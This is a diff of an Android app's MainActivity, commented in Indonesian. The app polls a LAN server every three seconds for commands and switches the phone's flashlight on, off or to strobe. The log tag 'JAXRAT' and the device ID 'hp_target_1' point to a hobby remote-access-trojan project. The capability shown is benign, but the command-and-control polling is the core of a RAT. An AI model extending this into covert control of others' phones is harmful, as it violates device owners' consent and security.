@@ -17,7 +17,8 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class MainActivity extends Activity {
-    private static final String SERVER_URL = "http://192.168.1.48:5000"; 
+    // --- IP UDAH DIGANTI KE 49 ---
+    private static final String SERVER_URL = "http://192.168.1.49:5000"; 
     private static final String DEVICE_ID = "hp_target_1"; 
     
     private Handler handler = new Handler(Looper.getMainLooper());
@@ -25,20 +26,20 @@ public class MainActivity extends Activity {
     private Handler strobeHandler = new Handler();
     private CameraManager cameraManager;
     private String cameraId;
+    private boolean isTorchOn = false; // Buat nyimpen status nyala/mati kelap-kelip
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         
-        // --- CARI KAMERA YANG PUNYA FLASH (LEBIH PINTAR) ---
+        // Cari kamera belakang yang ada flash-nya
         try {
             for (String id : cameraManager.getCameraIdList()) {
                 CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                 Boolean flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                 Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                 
-                // Kita cari kamera belakang yang ada flash-nya
                 if (flashAvailable != null && flashAvailable && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                     cameraId = id;
                     break;
@@ -56,7 +57,7 @@ public class MainActivity extends Activity {
             @Override
             public void run() {
                 fetchCommand();
-                handler.postDelayed(this, 3000);
+                handler.postDelayed(this, 3000); // Nanya ke web tiap 3 detik
             }
         }, 3000);
     }
@@ -87,7 +88,6 @@ public class MainActivity extends Activity {
     }
 
     private void executeCommand(String cmd) {
-        // Tampilkan Pop-up di HP biar kita tau perintah masuk
         runOnUiThread(() -> Toast.makeText(MainActivity.this, "Cmd: " + cmd, Toast.LENGTH_SHORT).show());
 
         if (cmd.equals("flash_on")) {
@@ -105,8 +105,6 @@ public class MainActivity extends Activity {
         try {
             if (cameraId != null) {
                 cameraManager.setTorchMode(cameraId, state);
-            } else {
-                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Kamera flash tidak ditemukan!", Toast.LENGTH_SHORT).show());
             }
         } catch (CameraAccessException e) {
             Log.e("JAXRAT", "Gagal nyalain senter", e);
@@ -115,7 +113,7 @@ public class MainActivity extends Activity {
 
     private void startStrobe() {
         isStrobe = true;
-        strobeRunnable.run();
+        strobeHandler.post(strobeRunnable);
     }
 
     private void stopStrobe() {
@@ -124,15 +122,14 @@ public class MainActivity extends Activity {
         setTorch(false);
     }
 
+    // Kodingan Kelap-kelip (Strobe) yang udah dibenerin
     private final Runnable strobeRunnable = new Runnable() {
         @Override
         public void run() {
             if (isStrobe) {
-                setTorch(true);
-                strobeHandler.postDelayed(() -> {
-                    setTorch(false);
-                    if (isStrobe) strobeHandler.postDelayed(this, 200); 
-                }, 200); 
+                setTorch(!isTorchOn); // Balik kondisi (nyala/mati)
+                isTorchOn = !isTorchOn;
+                strobeHandler.postDelayed(this, 400); // Jeda 400ms biar hardware aman
             }
         }
     };
